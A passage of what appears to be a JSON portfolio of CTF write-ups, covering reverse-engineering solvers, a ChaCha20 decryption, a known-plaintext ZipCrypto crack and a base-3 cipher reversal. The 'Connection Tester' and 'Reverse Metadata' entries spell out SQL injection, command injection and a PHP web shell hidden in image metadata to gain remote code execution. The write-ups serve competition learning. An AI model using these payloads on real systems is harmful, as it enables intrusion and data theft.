<code>bits</code> section (<code>0x4ce0 + i * 32 + k * 4</code>).</li>\n<li>  If all 8 bits matched, the shellcode returned 1 (success); otherwise, it returned 0 (failure).</li>\n</ul>\n5.  <strong>Reconstruction Algorithm:</strong>\n    To find the password, for each character <code>i</code> from 0 to 52:\n<ul>\n<li>  <strong>Get Key:</strong> Read the 4-byte key <code>K</code> from <code>0x4c00 + i * 4</code>.</li>\n<li>  <strong>Get Shift:</strong> Decrypt the first two bytes of the <code>i</code>-th shellcode. The second byte <code>b1</code> of the decrypted code (<code>data[0x3020 + 57*i + 1] ^ (K & 0xFF)</code>) yielded the <code>SHIFT</code> value.</li>\n<li>  <strong>Reconstruct Y:</strong> Initialize <code>Y = 0</code>. For <code>k</code> from 0 to 7:</li>\n<li>  Read <code>expected_bit</code> from <code>0x4ce0 + i * 32 + k * 4</code>.</li>\n<li>  Calculate the bit position: <code>bit_pos = (SHIFT + k) % 8</code>.</li>\n<li>  If <code>expected_bit</code> is 1, set the <code>bit_pos</code> bit in <code>Y</code>.</li>\n<li>  <strong>Derive Character:</strong> Since <code>Y = input_char ^ K</code>, then <code>input_char = Y ^ K</code>. As only the lower 8 bits were relevant (<code>Y</code> was an 8-bit value), the actual character was <code>chr(Y ^ (K & 0xFF))</code>.</li>\n</ul>\nThe Python script <code>solve_final_v2.py</code> implemented this logic.</p>\n<p><strong>Python Script (<code>solve_final_v2.py</code>):</strong></p>\n<pre><code class=\"python\">import struct\n<p>def solve():\n    with open('chal', 'rb') as f:\n        data = f.read()</p>\n<p># Offsets (determined from readelf -S chal)\n    # 0x4020 (data_section_offset) is relative to its containing .data section (0x3000 file offset)\n    # 0x4c00 (key_section_address) -&gt; 0x3c00 (file offset)\n    # 0x4ce0 (bits_section_address) -&gt; 0x3ce0 (file offset)\n    data_section_offset = 0x3020\n    key_section_offset = 0x3c00\n    bits_section_offset = 0x3ce0</p>\n<p>password = []</p>\n<p>for i in range(53):\n        # 1. Read Key (used as XOR key in the check function)\n        key_offset = key_section_offset + (i * 4)\n        key_bytes = data[key_offset:key_offset+4]\n        key = struct.unpack('&lt;I', key_bytes)[0] # Keys are 4-byte little endian integers</p>\n<p># 2. Decrypt the first two bytes of the shellcode to find 'start_shift'\n        # The instruction is 'b9 SHIFT 00 00 00' (mov $SHIFT, %ecx)\n        # Encrypted byte 0: data[data_section_offset + 57*i + 0]\n        # Encrypted byte 1: data[data_section_offset + 57*i + 1]</p>\n<p>enc_b0 = data[data_section_offset + 57*i + 0]\n        enc_b1 = data[data_section_offset + 57*i + 1]</p>\n<p>dec_b0 = enc_b0 ^ (key &amp; 0xFF) # The lowest byte of the key is used for shellcode decryption\n        dec_b1 = enc_b1 ^ (key &amp; 0xFF)</p>\n<p>if dec_b0 != 0xB9:\n            print(f\"Error: Func {i} does not start with 0xB9 (mov %ecx). Found {hex(dec_b0)}\")\n            # Fallback to default if there's an unexpected format, though this indicates an issue.\n            start_shift = 4 \n        else:\n            start_shift = dec_b1</p>\n<p># 3. Reconstruct Y = char ^ K (where K is the actual 4-byte key)\n        # The character's bits are checked in the order: (start_shift + k) % 8 for k = 0 to 7.</p>\n<p>Y = 0 # This will hold the 8-bit value of (char ^ K)\n        base_bits_offset = bits_section_offset + (i * 32)</p>\n<p>for k in range(8):\n            # The expected bit is stored as a single byte at base_bits_offset + (k * 4)\n            expected_bit_offset = base_bits_offset + (k * 4)\n            expected_bit = data[expected_bit_offset] # Read byte</p>\n<p># The bit position in Y being checked in this iteration\n            bit_pos = (start_shift + k) % 8</p>\n<p>if expected_bit: # If the expected bit is 1\n                Y |= (1 &lt;&lt; bit_pos) # Set that bit in Y</p>\n<p># 4. Derive the actual character\n        # We have Y = input_char ^ K. Therefore, input_char = Y ^ K.\n        # Since Y is an 8-bit value, we only care about the lowest 8 bits of K.\n        char_code = Y ^ (key &amp; 0xFF)\n        password.append(chr(char_code))</p>\n<p>print(\"Password:\", \"\".join(password))</p>\n<p>if __name__ == '__main__':\n    solve()\n</code></pre></p>\n<p><strong>Execution:</strong>\nRunning the script yielded the password:\n<code>flag{hm_she11c0d3_v4u17_cr4ck1ng_4r3_t0ugh_r1gh7!!??}</code></p>\n<p>Verification with <code>./chal</code> confirmed the flag:\n<code>echo \"flag{hm_she11c0d3_v4u17_cr4ck1ng_4r3_t0ugh_r1gh7!!??}\" | ./chal</code>\nOutput: <code>Good job</code></p>\n"
            },
            {
                "id": "where-code",
                "title": "Where code",
                "category": "Reverse Engineering",
                "tags": [
                    "crypto",
                    "cipher",
                    "xor",
                    "buffer",
                    "reverse",
                    "ghidra",
                    "memory"
                ],
                "writeup": "<p>1. Initial Analysis</p>\n<p>We started with a 64-bit ELF binary named challenge. Running strings on the binary revealed a critical clue:\nPlaintext</p>\n<p>expand 32-byte k</p>\n<p>This string is the distinct sigma constant used in ChaCha20 and Salsa20 stream ciphers. This immediately suggests that the flag is being encrypted or decrypted using one of these algorithms.\n2. Static Analysis (Decompilation)</p>\n<p>Opening the binary in a decompiler (like Ghidra) revealed a main function calling a subroutine FUN_00101592. Analyzing this subroutine confirmed the encryption logic.\nThe Encryption Routine</p>\n<p>The function initializes a state matrix using the constants found earlier:</p>\n<p>0x61707865 (\"apxe\")</p>\n<p>0x3320646e (\"3 dn\")</p>\n<p>0x79622d32 (\"yb-2\")</p>\n<p>0x6b206574 (\"k et\")</p>\n<p>Reversed (Little Endian), this spells \"expand 32-byte k\". The code then performs an XOR operation on the input buffer, confirming it is a stream cipher.\nIdentifying the Secrets</p>\n<p>To decrypt the flag, we needed three components: the Key, the Nonce (IV), and the Ciphertext. By analyzing the memory addresses in the decompiled code, we mapped the virtual addresses to file offsets:</p>\n<p>The Key (32 bytes):</p>\n<p>Location: 0x2080</p>\n<p>Value: A sequential pattern 00 01 02 ... 1F.</p>\n<p>The Nonce (12 bytes):</p>\n<p>Location: 0x20A0</p>\n<p>Value: Mostly nulls with 4A in the middle (000000000000004a00000000).</p>\n<p>The Ciphertext:</p>\n<p>Location: 0x2040</p>\n<p>Analysis: The main function passed a pointer to this address as the first argument to the encryption function. It contained roughly 34 bytes of raw binary data.</p>\n<p>3. The Problem</p>\n<p>Attempting to debug with GDB was inconsistent. Additionally, standard Python libraries (PyCryptodome) sometimes handle the ChaCha20 block counter differently (starting at 0 vs 1). The binary explicitly initialized the block counter to 1.\n4. The Solution</p>\n<p>We wrote a Python script to manually implement the ChaCha20 block function. This allowed us to:</p>\n<p>Extract the Key, Nonce, and Ciphertext directly from the binary file using the offsets found in Step 2.</p>\n<p>Force the block counter to start at 1 to match the binary's behavior.</p>\n<p>XOR the generated keystream with the ciphertext.</p>\n<p>Solver Script\n``<code>python \nimport struct</p>\n<p>def rotl32(x, n):\n    return ((x << n) & 0xffffffff) | (x >> (32 - n))</p>\n<p>def chacha20_block(key, counter, nonce):\n    constants = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574]\n    k = list(struct.unpack('<8I', key))\n    n = list(struct.unpack('<3I', nonce))\n    state = constants + k + [counter] + n\n    working_state = list(state)</p>\n<p># 20 rounds (Standard ChaCha20)\n    for _ in range(10): \n        def qr(a, b, c, d):\n            a = (a + b) & 0xffffffff; d ^= a; d = rotl32(d, 16)\n            c = (c + d) & 0xffffffff; b ^= c; b = rotl32(b, 12)\n            a = (a + b) & 0xffffffff; d ^= a; d = rotl32(d, 8)\n            c = (c + d) & 0xffffffff; b ^= c; b = rotl32(b, 7)\n            return a, b, c, d</p>\n<p># Column & Diagonal rounds\n        working_state[0], working_state[4], working_state[8], working_state[12] = qr(working_state[0], working_state[4], working_state[8], working_state[12])\n        working_state[1], working_state[5], working_state[9], working_state[13] = qr(working_state[1], working_state[5], working_state[9], working_state[13])\n        working_state[2], working_state[6], working_state[10], working_state[14] = qr(working_state[2], working_state[6], working_state[10], working_state[14])\n        working_state[3], working_state[7], working_state[11], working_state[15] = qr(working_state[3], working_state[7], working_state[11], working_state[15])\n        working_state[0], working_state[5], working_state[10], working_state[15] = qr(working_state[0], working_state[5], working_state[10], working_state[15])\n        working_state[1], working_state[6], working_state[11], working_state[12] = qr(working_state[1], working_state[6], working_state[11], working_state[12])\n        working_state[2], working_state[7], working_state[8], working_state[13] = qr(working_state[2], working_state[7], working_state[8], working_state[13])\n        working_state[3], working_state[4], working_state[9], working_state[14] = qr(working_state[3], working_state[4], working_state[9], working_state[14])</p>\n<p>return b''.join(struct.pack('<I', (working_state[i] + state[i]) & 0xffffffff) for i in range(16))</p>\n<p>with open(\"challenge\", \"rb\") as f:\n    data = f.read()\n    key = data[0x2080:0x20a0]\n    nonce = data[0x20a0:0x20ac]\n    cipher = data[0x2040:0x2062]</p>\n<p>keystream = chacha20_block(key, 1, nonce)\n    print(bytes(a ^ b for a, b in zip(cipher, keystream)).decode())\n</code>``</p>\n<p>5. The Flag</p>\n<p>Running the script produced the flag:</p>\n<p>flag{iN1_f!ni_Min1_m0...1_$e3_yOu}</p>\n"
            }
        ]
    },
    "HeroCTF v7": {
        "rank": "111th place",
        "description": "Competed in various challenge categories including web exploitation, cryptography, and reverse engineering.",
        "challenges": []
    },
    "PatriotCTF 2025": {
        "rank": "398th place",
        "description": "Comprehensive CTF with diverse challenge categories.",
        "challenges": [
            {
                "id": "burger-king",
                "title": "Burger King",
                "category": "Forensics",
                "tags": [
                    "crypto",
                    "web",
                    "http",
                    "crack",
                    "forensics",
                    "image"
                ],
                "writeup": "<h4>1. Reconnaissance</h4>\n<p>We were provided with an encrypted archive, <code>BurgerKing.zip</code>, and a partial file, <code>partial.svg</code>. The challenge description hinted at a \"forensics team\" called \"Burger King Crackers,\" a reference to the <strong>bkcrack</strong> (Biham-Kocher Crack) tool used for exploiting legacy Zip encryption.</p>\n<p>First, we analyzed the archive to check the encryption and compression methods:</p>\n<p>Bash</p>\n<pre><code class=\"\">unzip -v BurgerKing.zip\n</code></pre>\n<p><strong>Findings:</strong></p>\n<ul>\n<li><strong>Encryption:</strong> Legacy ZipCrypto (implied by the vulnerability context).</li>\n<li><strong>Compression:</strong> <code>Stored</code> (0% compression).</li>\n<li><strong>Files:</strong> 5 SVG files (<code>Hole.svg</code>, <code>LockAndKey.svg</code>, <code>Space.svg</code>, <code>Webs.svg</code>, <code>SVGsSuck.svg</code>).</li>\n</ul>\nThe fact that the files were <strong>Stored</strong> meant the raw plaintext bytes would match the encrypted bytes exactly, making a <strong>Known Plaintext Attack (KPA)</strong> trivial.\n<h4>2. Plaintext Preparation</h4>\n<p>We examined the provided <code>partial.svg</code> file:</p>\n<p>Bash</p>\n<pre><code class=\"\">cat partial.svg\n&lt;h2&gt;Output: &lt;svg xmlns=\"http://www.w3.org/2000/svg\"&lt;/h2&gt;\n</code></pre>\n<p>This string corresponds to the standard XML header found at the beginning of almost all SVG files. Since we know the start of the plaintext for the encrypted files, we can derive the internal encryption keys.</p>\n<p>We ensured the plaintext file was clean (no extra newlines) for the attack:</p>\n<p>Bash</p>\n<pre><code class=\"\">printf '&lt;svg xmlns=\"http://www.w3.org/2000/svg\"' &gt; partial.svg\n</code></pre>\n<h4>3. Cracking the Keys</h4>\n<p>We used <code>bkcrack</code> to perform the Known Plaintext Attack. We targeted <code>Space.svg</code> (though any of the SVGs would likely work) using the clean plaintext file.</p>\n<p>Bash</p>\n<pre><code class=\"\">./bkcrack -C BurgerKing.zip -c Space.svg -p partial.svg\n</code></pre>\n<p>The attack succeeded quickly because there was no compression to guess. <strong>Recovered Keys:</strong> <code>b9540c69 069a11f9 fd31648f</code></p>\n<h4>4. Decryption and Extraction</h4>\n<p>With the internal keys recovered, the password was no longer needed. We generated a new, unlocked version of the archive with a known password (<code>easy</code>) to extract all files at once.</p>\n<p>Bash</p>\n<pre><code class=\"\">./bkcrack -C BurgerKing.zip -k b9540c69 069a11f9 fd31648f -U unlocked.zip easy\nunzip unlocked.zip\n</code></pre>\n<h4>5. Retrieving the Flag</h4>\n<p>After extracting the files, we examined <code>SVGsSuck.svg</code> (the largest file in the archive). Opening the image revealed the flag written clearly within the graphic.</p>\n<p><strong>Flag:</strong></p>\n<p>Plaintext</p>\n<pre><code class=\"\">CACI{Y0U_F0UND_M3!}\n</code></pre>\n[[PatriotCTF-2025]]\n"
            },
            {
                "id": "cipher-from-hell",
                "title": "Cipher from Hell",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "reverse"
                ],
                "writeup": "<h3>Overview</h3>\n<p>We are given an encryption script <code>encryptor.py</code> that transforms an input flag into an encrypted file. The encryption process is inspired by Malbolge's \"crazy operation\" and involves base conversions and matrix lookups. Our goal is to reverse this process to recover the original flag from the <code>encrypted</code> file.</p>\n<h3>Encryption Analysis</h3>\n<p>Let's break down the encryption process:</p>\n<p>1. <strong>Input Conversion</strong>: The input string is converted to bytes and then to a large integer <code>s</code>.</p>\n<p>2. <strong>Base-3 Conversion</strong>: The integer <code>s</code> is treated as a base-3 number.</p>\n<p>3. <strong>Matrix Mapping</strong>: A 3\u00d73 matrix <code>o</code> is used to map pairs of base-3 digits to single base-9 digits:</p>\n<p>text</p>\n<p>o = (\n    (6, 0, 7),\n    (8, 2, 1), \n    (5, 4, 3)\n)</p>\n<p>1. <strong>Digit Processing</strong>: The base-3 digits are processed in pairs from most significant to least significant. For each pair <code>(a,b)</code>, the value <code>o[a][b]</code> is computed and added to the output.</p>\n<p>2. <strong>Output</strong>: The resulting base-9 number is written to the <code>encrypted</code> file as bytes.</p>\n<p>The key insight is that the encryption processes the base-3 digits <strong>in reverse order</strong> (most significant first), which we must account for during decryption.</p>\n<h3>Decryption Strategy</h3>\n<p>To reverse the encryption, we need to:</p>\n<p>1. <strong>Read the encrypted file</strong> and convert it back to an integer <code>ss</code>.</p>\n<p>2. <strong>Convert <code>ss</code> to base-9 digits</strong> (this gives us the output of the matrix lookups).</p>\n<p>3. <strong>Create a reverse mapping</strong> from matrix output values to input pairs.</p>\n<p>4. <strong>Map each base-9 digit back</strong> to its corresponding pair of base-3 digits.</p>\n<p>5. <strong>Reconstruct the base-3 number</strong> from these digit pairs.</p>\n<p>6. <strong>Convert the base-3 number back</strong> to bytes to recover the flag.</p>\n<h3>Solution Implementation</h3>\n<p>Here's the step-by-step decryption process:</p>\n<h4>Step 1: Read the Encrypted File</h4>\n<p>python</p>\n<p>with open(\"encrypted\", 'rb') as f:\n    encrypted_bytes = f.read()\nss = int.from_bytes(encrypted_bytes, byteorder='big')</p>\n<h4>Step 2: Convert to Base-9 Digits</h4>\n<p>python</p>\n<p>base9_digits = []\ntemp = ss\nwhile temp > 0:\n    base9_digits.append(temp % 9)\n    temp //= 9\nbase9_digits.reverse()</p>\n<h4>Step 3: Create Reverse Mapping</h4>\n<p>We need to find for each output value <code>v</code>, which input pair <code>(i,j)</code> satisfies <code>o[i][j] = v</code>:</p>\n<p>python</p>\n<p>reverse_o = {}\nfor i in range(3):\n    for j in range(3):\n        reverse_o[o[i][j]] = (i, j)</p>\n<p>This gives us:</p>\n<ul>\n<li><code>0 \u2192 (0,1)</code></li>\n<li><code>1 \u2192 (1,2)</code></li>\n<li><code>2 \u2192 (1,1)</code></li>\n<li><code>3 \u2192 (2,2)</code></li>\n<li><code>4 \u2192 (2,1)</code></li>\n<li><code>5 \u2192 (2,0)</code></li>\n<li><code>6 \u2192 (0,0)</code></li>\n<li><code>7 \u2192 (0,2)</code></li>\n<li><code>8 \u2192 (1,0)</code></li>\n</ul>\n<h4>Step 4: Map Base-9 Digits to Base-3 Pairs</h4>\n<p>python</p>\n<p>pairs = [reverse_o[d] for d in base9_digits]</p>\n<h4>Step 5: Reconstruct Base-3 Number</h4>\n<p>The encryption processes digits from most significant to least significant, so we need to carefully reconstruct the base-3 number:</p>\n<p>python</p>\n<h2>The pairs represent: (most_significant_digit, least_significant_digit), </h2>\n<h2>(second_most_significant, second_least_significant), etc.</h2>\nn = len(pairs) * 2\nbase3_digits = [0] * n\n<p>for i, (l, r) in enumerate(pairs):\n    base3_digits[i] = l           # Fill from left (most significant)\n    base3_digits[n-1-i] = r       # Fill from right (least significant)</p>\n<h2>Convert base-3 digits to integer</h2>\ns_decrypted = 0\nfor digit in base3_digits:\n    s_decrypted = s_decrypted * 3 + digit\n<h4>Step 6: Convert to Bytes and Decode</h4>\n<p>python</p>\n<p>byte_length = (s_decrypted.bit_length() + 7) // 8\nflag_bytes = s_decrypted.to_bytes(byte_length, byteorder='big')\nflag = flag_bytes.decode(errors='ignore')</p>\n<h3>Final Script</h3>\n<p>``<code> python\nimport math</p>\n<p>def decrypt():\n    # Read the encrypted file\n    with open(\"encrypted\", 'rb') as f:\n        encrypted_bytes = f.read()</p>\n<p># Convert to integer\n    ss = int.from_bytes(encrypted_bytes, byteorder='big')</p>\n<p># The mapping matrix used in encryption\n    o = (\n        (6, 0, 7),\n        (8, 2, 1),\n        (5, 4, 3)\n    )</p>\n<p># Create reverse mapping: from output value to (i,j) coordinates\n    reverse_o = {}\n    for i in range(3):\n        for j in range(3):\n            reverse_o[o[i][j]] = (i, j)</p>\n<p># Convert integer ss to base-9 digits\n    if ss == 0:\n        base9_digits = [0]\n    else:\n        base9_digits = []\n        temp = ss\n        while temp > 0:\n            base9_digits.append(temp % 9)\n            temp //= 9\n        base9_digits.reverse()  # now most significant first</p>\n<p># Now, for each base-9 digit, get the pair (l, r)\n    pairs = []\n    for digit in base9_digits:\n        if digit not in reverse_o:\n            raise ValueError(f\"Invalid digit {digit} in base-9 representation\")\n        pairs.append(reverse_o[digit])</p>\n<p># Number of pairs\n    m = len(pairs)\n    n = 2 * m  # number of base-3 digits</p>\n<p># Create an array for base-3 digits\n    base3_digits = [0] * n\n    for i, (l, r) in enumerate(pairs):\n        base3_digits[i] = l\n        base3_digits[n - 1 - i] = r</p>\n<p># Convert base-3 digits to integer\n    s_decrypted = 0\n    for digit in base3_digits:\n        s_decrypted = s_decrypted * 3 + digit</p>\n<p># Convert integer to bytes\n    if s_decrypted == 0:\n        byte_length = 1\n    else:\n        byte_length = (s_decrypted.bit_length() + 7) // 8</p>\n<p>flag_bytes = s_decrypted.to_bytes(byte_length, byteorder='big')</p>\n<p>return flag_bytes.decode(errors='ignore')</p>\n<p>if __name__ == '__main__':\n    flag = decrypt()\n    print(f\"Recovered flag: {flag}\")\n</code>`<code>\n<h3>Flag Recovery</h3></p>\n<p>Running this decryption process on the provided </code>encrypted` file reveals the flag:</p>\n<p>pctf{a_l3ss_cr4zy_tr1tw1s3_op3r4ti0n_f37d4b}</p>\n<p>[[PatriotCTF-2025]]</p>\n"
            },
            {
                "id": "connection-tester",
                "title": "Connection Tester",
                "category": "Web Exploitation",
                "tags": [
                    "http",
                    "cookie",
                    "sql",
                    "injection"
                ],
                "writeup": "<p><strong>Writeup for \"Connection Tester\" challenge:</strong></p>\n<p>1.  <strong>Initial Reconnaissance:</strong> Accessed <code>http://18.212.136.134:9080/</code>. It redirected to <code>/login</code>.\n2.  <strong>Authentication Bypass (SQL Injection):</strong>\n<ul>\n<li>  Inspected the <code>/login</code> page and found a standard username/password form.</li>\n<li>  Attempted SQL injection with <code>username=' OR 1=1 --</code> and <code>password=password</code>.</li>\n<li>  Login was successful, redirecting to <code>/dashboard</code>.</li>\n</ul>\n3.  <strong>Session Management:</strong>\n<ul>\n<li>  Used <code>curl -c cookies.txt</code> to save the session cookie after successful login.</li>\n<li>  Accessed <code>/dashboard</code> using <code>curl -b cookies.txt</code>.</li>\n</ul>\n4.  <strong>Command Injection Discovery:</strong>\n<ul>\n<li>  The dashboard presented a \"Connectivity Tester\" with a \"Target Address\" input.</li>\n<li>  This is a classic command injection vector.</li>\n<li>  Tested with <code>address=127.0.0.1; ls</code>. The output indicated <code>ls...: not found</code>, suggesting an appended <code>...</code>.</li>\n</ul>\n5.  <strong>Command Injection Exploitation:</strong>\n<ul>\n<li>  Used <code>address=127.0.0.1; ls -la #</code> to comment out the appended <code>...</code>.</li>\n<li>  Successfully executed <code>ls -la</code> and obtained a directory listing, revealing <code>flag.txt</code>.</li>\n<li>  Used <code>address=127.0.0.1; cat flag.txt #</code> to read the flag.</li>\n</ul>\n6.  <strong>Flag:</strong> <code>PCTF{C0nn3cti0n_S3cured}</code></p>\n<p>[[PatriotCTF-2025]]</p>\n"
            },
            {
                "id": "reverse-metadata-1",
                "title": "Reverse Metadata-1",
                "category": "Miscellaneous",
                "tags": [
                    "web",
                    "http",
                    "image",
                    "misc"
                ],
                "writeup": "<p>misc\n<h3>1. Overview</h3></p>\n<p>The target was a web application running on port <code>9090</code> that allowed users to upload image files. The application verified the file header (Magic Bytes) to ensure it was an image but failed to sanitize metadata or strictly enforce file extensions. This allowed for a <strong>Metadata Polyglot Attack</strong> leading to <strong>Remote Code Execution (RCE)</strong>.</p>\n<h3>2. Reconnaissance</h3>\n<ul>\n<li><strong>Discovery:</strong> Found an upload form at <code>http://18.212.136.134:9090/</code>.</li>\n<li><strong>Behavior:</strong> The server accepted image uploads (JPG/PNG) and displayed them.</li>\n<li><strong>Vulnerability Detection:</strong> We suspected the server was parsing metadata (EXIF) without sanitization.</li>\n</ul>\n<h3>3. Exploitation</h3>\n<p>We used a \"Polyglot\" file\u2014a valid JPEG image that contained hidden PHP code in its metadata tags.</p>\n<h4>Step 1: Payload Creation</h4>\n<p>Using <code>exiftool</code>, we injected a PHP web shell into the <code>Comment</code> tag of a standard image.</p>\n<p><strong>Command:</strong></p>\n<p>Bash</p>\n<pre><code class=\"\">exiftool -Comment='&lt;?php system($_GET[\"cmd\"]); ?&gt;' cat.jpg\n</code></pre>\n<h4>Step 2: Extension Bypass</h4>\n<p>The server checked if the file _started_ like an image (Magic Bytes <code>FF D8 FF</code>) but allowed the file extension to be changed. We renamed the file to force the server to process it as a PHP script.</p>\n<p><strong>Command:</strong></p>\n<p>Bash</p>\n<pre><code class=\"\">mv cat.jpg cat.php\n</code></pre>\n<h4>Step 3: Execution</h4>\n<p>We uploaded <code>cat.php</code>. The server accepted it because of the valid JPEG header. We then accessed the file via the browser, passing commands through the <code>cmd</code> parameter.</p>\n<p><strong>URL:</strong> <code>http://18.212.136.134:9090/uploads/cat.php?cmd=id</code></p>\n<p><strong>Response:</strong> The server executed the embedded PHP code and returned: <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></p>\n<h3>4. Flag Capture</h3>\n<p>With RCE established, we enumerated the file system.</p>\n<p>1. <strong>Located Flag Directory:</strong> <code>?cmd=ls -la /</code> _Result:_ Found a non-standard directory named <code>/flags</code>.</p>\n<p>2. <strong>Located Flag File:</strong> <code>?cmd=ls -la /flags</code> _Result:_ Found <code>root.txt</code>.</p>\n<p>3. <strong>Retrieved Flag:</strong> <code>?cmd=cat /flags/root.txt</code></p>\n<p><strong>Final Flag:</strong> <code>MASONCC{images_give_us_bash?}</code></p>\n<p>[[PatriotCTF-2025]]</p>\n"
            },
            {
                "id": "reverse-metadata-2",
                "title": "Reverse Metadata-2",
                "category": "Miscellaneous",
                "tags": [
                    "image",
                    "disk"
                ],
                "writeup": "<h3>1. Executive Summary</h3>\n<p>After achieving initial Remote Code Execution (RCE) via an image polyglot upload, the objective was to locate a \"deleted\" flag hidden on the system. While the challenge environment contained a vulnerable Cron Job running <code>exiftool</code> as root (suggesting a CVE-2021-22204 exploit path), we discovered the flag exposed in plain text within the process list. The vulnerability stemmed from passing sensitive data (the flag) directly into command-line arguments, which are readable by all users on standard Linux configurations.</p>\n<h3>2. Initial Access</h3>\n<p>We established a foothold on the server as the <code>www-data</code> user by uploading a malicious PHP file disguised as a JPEG image (<code>cat.php</code>). This allowed us to execute system commands via the browser.</p>\n<h3>3. Enumeration</h3>\n<p>We began standard Linux enumeration to identify background services, looking for the script mentioned in the challenge description (\"processes uploaded images... every few minutes\").</p>\n<p>We ran the process list command to see what was running as <strong>root</strong>:</p>\n<p>Bash</p>\n<pre><code class=\"\">ps -aux | grep root\n</code></pre>\n<h3>4. The Discovery</h3>\n<p>The output of the process list revealed a critical security flaw. Instead of running a python script from a file (e.g., <code>python3 /root/script.py</code>), the root user was running a Python \"one-liner\" passed directly via the <code>-c</code> command argument.</p>\n<p><strong>Output:</strong></p>\n<p>Plaintext</p>\n<pre><code class=\"\">root      15  0.0  0.0  12136  7964 ?        S    08:30   0:00 python3 -c  import time, os  FLAG=\"/tmp/flag.txt\"  # create flag file f = open(FLAG, \"w\") f.write(\"PCTF{hidden_in_depths}\\n\") f.flush()  # unlink instantly (file disappears from /tmp) os.unlink(FLAG)  # keep process alive so FD stays in RAM while True:     time.sleep(100)\n</code></pre>\n<h4>Breakdown of the Vulnerable Script:</h4>\n<p>1. <strong><code>f.write(\"PCTF{hidden_in_depths}\\n\")</code></strong>: The flag was hardcoded into the script logic.</p>\n<p>2. <strong><code>os.unlink(FLAG)</code></strong>: The script immediately deleted the file from the disk. This effectively prevented us from finding it using <code>ls</code> or <code>find</code>.</p>\n<p>3. <strong><code>while True: time.sleep(100)</code></strong>: The script kept running indefinitely to keep the process alive.</p>\n<h3>5. The Vulnerability: Command Line Argument Leaks</h3>\n<p>On Linux systems, the full command line used to start a process is stored in <code>/proc/[PID]/cmdline</code>. By default, any user (including our low-privileged <code>www-data</code> user) can read the process list and arguments of other users, including root.</p>\n<p>Because the developer included the <strong>source code</strong> (containing the flag) in the command arguments (<code>python3 -c \"...\"</code>), the flag was leaked to the process table.</p>\n<h3>6. Conclusion & Mitigation</h3>\n<p>We successfully retrieved the flag <code>PCTF{hidden_in_depths}</code> without needing to escalate privileges or exploit the ExifTool vulnerability.</p>\n<p><strong>Intended Solution vs. Our Solution:</strong></p>\n<ul>\n<li><strong>Intended:</strong> Exploit the root cron job running <code>exiftool</code> (CVE-2021-22204) to copy the deleted file from <code>/root/.local/share/Trash</code>.</li>\n<li><strong>Actual:</strong> Found the flag in the process listing due to insecure scripting practices.</li>\n</ul>\n<strong>Remediation:</strong> To prevent this, secrets should never be passed as command-line arguments. The script should have been saved to a file (readable only by root) and executed as <code>python3 /path/to/script.py</code>. Additionally, server hardening (mounting <code>/proc</code> with <code>hidepid=2</code>) would prevent users from seeing processes belonging to other users.\n<p>[[PatriotCTF-2025]]</p>\n"
            },
            {
                "id": "space-pirates-1",
                "title": "Space Pirates-1",
                "category": "Reverse Engineering",
                "tags": [
                    "rsa",
                    "xor",
                    "buffer",
                    "overflow",
                    "reverse"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>The challenge provides a C program (<code>challenge.c</code>) that takes a 30-character command-line argument as input. It then performs a series of transformations on this input and compares the result to a hardcoded target value. If the transformed input matches the target, the original input is the flag, and the program prints a success message.</p>\n<p>The core of the challenge lies in understanding the transformations and reversing them to find the correct input that produces the target value.</p>\n<h3>Analyzing the Transformations</h3>\n<p>The <code>challenge.c</code> program applies four distinct operations to the input string. Let's examine them in the order they are applied:</p>\n<p>1.  <strong>XOR with a Rotating Key:</strong> Each byte of the input is XORed with a byte from a 5-byte key (<code>XOR_KEY</code>). The key byte is selected based on the position of the input byte, cycling through the key.</p>\n<pre><code class=\"c\">    for (int i = 0; i &lt; FLAG_LEN; i++) {\n        buffer[i] ^= XOR_KEY[i % 5];\n    }\n    </code></pre>\n<p>2.  <strong>Swap Adjacent Byte Pairs:</strong> The program swaps every pair of adjacent bytes. For example, the bytes at indices 0 and 1 are swapped, then the bytes at indices 2 and 3 are swapped, and so on.</p>\n<pre><code class=\"c\">    for (int i = 0; i &lt; FLAG_LEN; i += 2) {\n        uint8_t temp = buffer[i];\n        buffer[i] = buffer[i + 1];\n        buffer[i + 1] = temp;\n    }\n    </code></pre>\n<p>3.  <strong>Add Magic Constant:</strong> A constant value (<code>MAGIC_ADD</code>, which is <code>0x2A</code>) is added to each byte. The addition is performed modulo 256 to handle overflow.</p>\n<pre><code class=\"c\">    for (int i = 0; i &lt; FLAG_LEN; i++) {\n        buffer[i] = (buffer[i] + MAGIC_ADD) % 256;\n    }\n    </code></pre>\n<p>4.  <strong>XOR with Position:</strong> Each byte is XORed with its own index in the array.</p>\n<pre><code class=\"c\">    for (int i = 0; i &lt; FLAG_LEN; i++) {\n        buffer[i] ^= i;\n    }\n    </code></pre>\n<p>After these transformations, the resulting <code>buffer</code> is compared with the <code>TARGET</code> array.</p>\n<h3>The Reversal Strategy</h3>\n<p>To find the flag, we need to reverse these operations, starting from the <code>TARGET</code> value and working our way back to the original input. The key is to apply the inverse of each operation in the reverse order.</p>\n<p>Here's the reversal plan:</p>\n<p>1.  <strong>Reverse XOR with Position:</strong> The inverse of XORing with a value is XORing with the same value again. So, we'll XOR each byte of the <code>TARGET</code> array with its index.</p>\n<p>2.  <strong>Reverse Add Magic Constant:</strong> The inverse of adding a constant is subtracting the same constant. We'll subtract <code>MAGIC_ADD</code> from each byte, again using modulo 256 arithmetic.</p>\n<p>3.  <strong>Reverse Swap Adjacent Byte Pairs:</strong> The inverse of swapping pairs is... swapping them again! This operation is its own inverse.</p>\n<p>4.  <strong>Reverse XOR with Rotating Key:</strong> Similar to the position XOR, we'll XOR each byte with the corresponding byte from the <code>XOR_KEY</code>.</p>\n<h3>The Solver</h3>\n<p>The provided <code>solver.c</code> program implements this reversal strategy. Let's look at the code:</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdint.h&gt;\n<p>#define FLAG_LEN 30\nconst uint8_t TARGET[FLAG_LEN] = {\n    0x5A,0x3A,0x5B,0x9C,0x98,0x73,0xAE,0x32,0x25,0x47,0x48,0x51,0x6C,0x71,0x3A,0x62,0xB8,0x7B,0x63,0x57,0x25,0x89,0x58,0xBF,0x78,0x34,0x98,0x71,0x68,0x59\n};</p>\n<p>const uint8_t XOR_KEY[5] = {0x42, 0x73, 0x21, 0x69, 0x37};\nconst uint8_t MAGIC_ADD = 0x2A;</p>\n<p>int main() {\n    